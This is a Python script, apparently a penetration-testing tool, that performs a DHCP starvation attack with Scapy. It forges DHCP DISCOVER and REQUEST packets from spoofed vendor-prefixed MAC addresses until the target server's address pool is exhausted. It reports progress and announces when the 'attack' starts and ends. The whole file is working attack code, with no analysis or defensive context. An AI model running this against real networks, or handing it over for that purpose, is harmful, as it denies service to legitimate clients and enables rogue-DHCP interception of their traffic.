from scapy.all import *
from colorama import *
from tqdm import tqdm
from tqdm import TqdmWarning
import warnings
warnings.filterwarnings("ignore", category=TqdmWarning)


def dhcp_starvation(count, ip_dhcp, interval, interface):
    try:
        print(Fore.YELLOW + "    [!] Waiting for DHCP server response ...")  # Переведено
        if ip_dhcp == None:  # Если неважен IP адрес DHCP сервера
            packages_sent = 0
            step = 100 / count  # Задаем шаг для прогресс бара
            for i in range(count):
                mac_list = ["04:b0:e7:", "18:1e:b0:",  # HUAWEI/Samsung
                            "b8:ca:3a:", "fc:08:4a:",  # Dell/Fujitsu
                            "00:25:2e:", "2c:c2:53:",  # Cisco/Apple
                            "c4:65:16:", "38:d5:47:",  # HP/ASUS
                            "e4:1f:13:", "9c:32:ce:",  # IBM/Canon
                            "d0:28:ba:", "6c:24:83:",  # Realme/Microsoft
                            "44:90:46:", "74:d4:35:",  # HONOR/GIGABYTE
                            "88:70:8c:", "90:e8:68:",  # Lenovo/AzureWave
                            "a4:1a:6e:", "d0:c7:c0:",  # ZTE/TPlink
                            "c8:13:37:", "00:05:c9:",  # Juniper/LG
                            "24:21:ab:", "fc:75:16:",  # Sony/D-Link
                            "60:9c:9f:", "00:00:aa:"]  # Brocade/Xerox

                client_mac = [random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random.randint(0x00, 0x7f)]
                client_mac = ':'.join(map(lambda x: '%02x' % x, client_mac))
                xid = random.randint(0x00000000, 0xffffffff)
                client_mac = random.choice(mac_list) + client_mac
                client_mac_bytes = bytes.fromhex(client_mac.replace(":", "").replace("-", ""))
                conf.checkIPaddr = False

                discover_packet = (Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") /
                                   IP(src="0.0.0.0", dst="255.255.255.255") /
                                   UDP(sport=68, dport=67) /
                                   BOOTP(op=1, chaddr=client_mac_bytes, xid=xid) /
                                   DHCP(options=[("message-type", "discover"), "end"]))
                response_for_discover = srp1(discover_packet, timeout = 10, verbose = False, iface = interface)  # Отправляем DISCOVER пакет и слушаем ответ

                if response_for_discover and response_for_discover[DHCP].options[0][1] == 2:  # Если DHCP сервер ответил OFFER (2 - это OFFER)
                    options = response_for_discover[DHCP].options
                    ip_address_dhcp = response_for_discover[IP].src
                    mac_address_dhcp = response_for_discover[Ether].src
                    mac_address_dhcp = mac_address_dhcp.upper()
                    for i, item in enumerate(options):
                        if item[0] == 'server_id':
                            server_id = i
                        if item[0] == 'router':
                            router = i
                        if item[0] == 'lease_time':
                            lease_time = i
                        if item[0] == 'subnet_mask':
                            subnet_mask = i
                        if item[0] == 'name_server':
                            name_server = i

                    if packages_sent == 0:  # Если ни одного пакета еще не отправлено
                        print(Fore.YELLOW + f"    [!] [RECEIVED]")
                        print(Fore.GREEN + f"    [+] DHCP Server: ")
                        print(Fore.GREEN + f"        IP: {ip_address_dhcp}")
                        print(Fore.GREEN + f"        MAC: {mac_address_dhcp}")
                        print(Fore.GREEN + f"    [+] Attack initiated...\n")  # Переведено
                        progress_bar = tqdm(total=100, ncols=100, desc="    Progress: ", bar_format="\033[0m{l_bar}{bar}| {n:.0f}/{total:.0f} [{elapsed}<{remaining}]\033[0m")

                    request_packet = (Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") /
                                      IP(src="0.0.0.0", dst="255.255.255.255") /
                                      UDP(sport=68, dport=67) /
                                      BOOTP(op=1, chaddr=client_mac_bytes, xid=xid) /
                                      DHCP(options=[("message-type", "request"),
                                                    ("requested_addr", response_for_discover[BOOTP].yiaddr),
                                                    ("server_id", response_for_discover[DHCP].options[server_id][1]),
                                                    ("router", response_for_discover[DHCP].options[router][1]),
                                                    ("name_server", response_for_discover[DHCP].options[name_server][1]),
                                                    ("subnet_mask", response_for_discover[DHCP].options[subnet_mask][1]),
                                                    ("lease_time", int(response_for_discover[DHCP].options[lease_time][1])),
                                                    "end"]))
                    response_for_request = srp1(request_packet, timeout = 10, verbose = False, iface = interface)  # Отправляем REQUEST и слушаем ответ
                    if response_for_request and response_for_request[DHCP].options[0][1] == 5:  # Если DHCP сервер ответил ACK  (5 - это ACK)
                        packages_sent += 1  # Счетчик отправленных пакетов
                        progress_bar.update(step)
                        if packages_sent == count:  # Если отправлено нужное количество пакетов DISCOVER
                            progress_bar.close()
                            print(Fore.GREEN + f"\n    [+] Attack completed successfully. IP addresses reserved: {count}\n")  # Переведено

                        else:  # Если это не последний DISCOVER пакет
                            time.sleep(interval)
                    else:  # Если сервер не отвечает на REQUEST
                        progress_bar.close()
                        print(Fore.RED + f"\n    [-] DHCP server is not responding! Attack continuation impossible.")  # Переведено
                        print(Fore.RED + f"    [-] IP addresses reserved: {packages_sent}\n")  # Переведено
                        break

                else:  # Если DHCP сервер не отвечает или недоступен
                    if packages_sent == 0:  # Если DHCP сервер не ответил ни разу (недоступен)
                        print(Fore.RED + f"    [-] DHCP server is not responding! Attack continuation impossible.")  # Переведено
                        break
                    else:  # Если сервер перестал отвечать (закончился пул свободных адресов)
                        progress_bar.close()
                        print(Fore.RED + f"\n    [-] DHCP server is not responding! Attack continuation impossible.")  # Переведено
                        print(Fore.RED + f"    [-] IP addresses reserved: {packages_sent}\n")  # Переведено
                        break

        else:  # Если выбран DHCP сервер с определенным IP адресом
            packages_sent = 0
            step = 100 / count
            for i in range(count):
                mac_list = ["04:b0:e7:", "18:1e:b0:",  # HUAWEI/Samsung
                            "b8:ca:3a:", "fc:08:4a:",  # Dell/Fujitsu
                            "00:25:2e:", "2c:c2:53:",  # Cisco/Apple
                            "c4:65:16:", "38:d5:47:",  # HP/ASUS
                            "e4:1f:13:", "9c:32:ce:",  # IBM/Canon
                            "d0:28:ba:", "6c:24:83:",  # Realme/Microsoft
                            "44:90:46:", "74:d4:35:",  # HONOR/GIGABYTE
                            "88:70:8c:", "90:e8:68:",  # Lenovo/AzureWave
                            "a4:1a:6e:", "d0:c7:c0:",  # ZTE/TPlink
                            "c8:13:37:", "00:05:c9:",  # Juniper/LG
                            "24:21:ab:", "fc:75:16:",  # Sony/D-Link
                            "60:9c:9f:", "00:00:aa:"]  # Brocade/Xerox

                client_mac = [random.randint(0x00, 0x7f), random.randint(0x00, 0x7f), random.randint(0x00, 0x7f)]
                client_mac = ':'.join(map(lambda x: '%02x' % x, client_mac))
                xid = random.randint(0x00000000, 0xffffffff)
                client_mac = random.choice(mac_list) + client_mac
                client_mac_bytes = bytes.fromhex(client_mac.replace(":", "").replace("-", ""))
                conf.checkIPaddr = False

                discover_packet = (Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") /
                                   IP(src="0.0.0.0", dst="255.255.255.255") /
                                   UDP(sport=68, dport=67) /
                                   BOOTP(op=1, chaddr=client_mac_bytes, xid=xid) /
                                   DHCP(options=[("message-type", "discover"), "end"]))
                response_for_discover, _ = srp(discover_packet, timeout=10, verbose=False, filter= f"udp and (port 67 or 68) and src host {ip_dhcp}", iface=interface)

                if response_for_discover:
                    for _, response in response_for_discover:
                        if response.haslayer(DHCP) and response[IP].src == ip_dhcp and response[DHCP].options[0][1] == 2:
                            options = response[DHCP].options
                            ip_address_dhcp = response[IP].src
                            mac_address_dhcp = response[Ether].src
                            mac_address_dhcp = mac_address_dhcp.upper()
                            for i, item in enumerate(options):
                                if item[0] == 'server_id':
                                    server_id = i
                                if item[0] == 'router':
                                    router = i
                                if item[0] == 'lease_time':
                                    lease_time = i
                                if item[0] == 'subnet_mask':
                                    subnet_mask = i
                                if item[0] == 'name_server':
                                    name_server = i

                            if packages_sent == 0:
                                print(Fore.YELLOW + f"    [!] [RECEIVED]")
                                print(Fore.GREEN + f"    [+] DHCP Server: ")
                                print(Fore.GREEN + f"        IP: {ip_address_dhcp}")
                                print(Fore.GREEN + f"        MAC: {mac_address_dhcp}")
                                print(Fore.GREEN + f"    [+] Attack initiated...\n")  # Переведено
                                progress_bar = tqdm(total=100, ncols=100, desc="    Progress: ", bar_format="\033[0m{l_bar}{bar}| {n:.0f}/{total:.0f} [{elapsed}<{remaining}]\033[0m")

                            request_packet = (Ether(src=client_mac, dst="ff:ff:ff:ff:ff:ff") /
                                              IP(src="0.0.0.0", dst="255.255.255.255") /
                                              UDP(sport=68, dport=67) /
                                              BOOTP(op=1, chaddr=client_mac_bytes, xid=xid) /
                                              DHCP(options=[("message-type", "request"),
                                                            ("requested_addr", response[BOOTP].yiaddr),
                                                            ("server_id", response[DHCP].options[server_id][1]),
                                                            ("router", response[DHCP].options[router][1]),
                                                            ("name_server", response[DHCP].options[name_server][1]),
                                                            ("subnet_mask", response[DHCP].options[subnet_mask][1]),
                                                            ("lease_time", int(response[DHCP].options[lease_time][1])),
                                                            "end"]))
                            response_for_request = srp1(request_packet, timeout=10, verbose=False, filter= f"udp and (port 67 or 68) and src host {ip_dhcp}", iface=interface)

                            if response_for_request and response_for_request[IP].src == ip_dhcp and response_for_request[DHCP].options[0][1] == 5:  # 5 - это ACK
                                packages_sent += 1  # Счетчик отправленных пакетов
                                progress_bar.update(step)
                                if packages_sent == count:
                                    progress_bar.close()
                                    print(Fore.GREEN + f"\n    [+] Attack completed successfully. IP addresses reserved: {count}\n")  # Переведено

                                else:
                                    time.sleep(interval)
                            else:
                                progress_bar.close()
                                print(Fore.RED + f"\n    [-] DHCP server is not responding! Attack continuation impossible.")  # Переведено
                                print(Fore.RED + f"    [-] IP addresses reserved: {packages_sent}\n")
                                break

                        else:
                            print(Fore.RED + f"    [-] DHCP server is not responding! Attack continuation impossible.")  # Переведено
                            break

                else:  # Если DHCP сервер не отвечает или недоступен
                    if packages_sent == 0:
                        print(Fore.RED + f"    [-] DHCP server is not responding! Attack continuation impossible.")  # Переведено
                        break
                    else:
                        progress_bar.close()
                        print(Fore.RED + f"\n    [-] DHCP server is not responding! Attack continuation impossible.")  # Переведено
                        print(Fore.RED + f"    [-] IP addresses reserved: {packages_sent}\n")  # Переведено
                        break

    except KeyboardInterrupt:
        progress_bar.close()
        print(Fore.YELLOW + f"\n    [!] Attack stopped (User pressed Ctrl + C)")  # Переведено